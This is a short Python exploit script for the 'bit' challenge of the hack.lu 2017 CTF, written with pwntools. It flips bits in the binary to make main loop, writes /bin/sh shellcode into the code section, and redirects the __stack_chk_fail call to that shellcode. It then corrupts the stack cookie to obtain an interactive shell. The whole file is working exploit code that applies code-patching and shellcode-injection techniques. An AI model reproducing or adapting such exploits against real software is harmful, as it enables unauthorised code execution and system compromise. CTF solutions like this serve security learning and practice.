# Quickly written exploit for "bit" task (CTF hack.lu 2017) by jla
# (sec-it-solutions.fr).

from pwn import *

def write_value(io, elf, addr, new):
    # write new bytes at addr address.
    new = int(new.encode('hex'), 16)
    initial = elf.data[addr - 0x400000]
    initial = int(initial.encode('hex'), 16)
  
    log.info("At {}, replace {} with {}".format(hex(addr), hex(initial), hex(new)))
  
    for bit in range(0, 8):
        if (initial & (1<<bit)) != (new & (1<<bit)):
            payload = "{}:{}".format(hex(addr), bit)
            io.sendline(payload)

if __name__ == '__main__':

    io = process('./bit')
    #io = remote('flatearth.fluxfingers.net', 1744)

    elf = ELF('./bit')

    # patch jmp to loop on main()
    #   0x0040072a      7405           je 0x400731
    io.sendline("0x40072b:4")
    
    # write shellcode at 0x00400570
    context.arch = "amd64"
    shellcode = asm(shellcraft.amd64.sh())
    start = 0x00400570
    for c in shellcode:
        write_value(io, elf, start, c)
        start += 1
    
    # patch callq sym.imp.__stack_chk_fail()
    #   0x0040072c      e8bffdffff     callq sym.imp.__stack_chk_fail
    # Instead we want: call 0xfffffe44  (0xfffffe44 = -444 => 0x400570)
    #   root@pwn:/# rasm2 'call 0xfffffe44'
    #   e83ffeffff
    new_call="\xe8\x3f\xfe\xff\xff"
    start = 0x0040072c
    for c in new_call:
        write_value(io, elf, start, c)
        start += 1
    
    # finally corrupt the cookie!
    #   0x0040071d      488b75f8       movq local_8h, %rsi
    #   0x00400721      644833342528.  xorq %fs:0x28, %rsi
    #   byte:0xf8 value:0 result:0xf9
    # Instead we want:
    #   movq local_7h, %rsi
    io.sendline("0x400720:0")
    
    # shell!
    io.interactive()
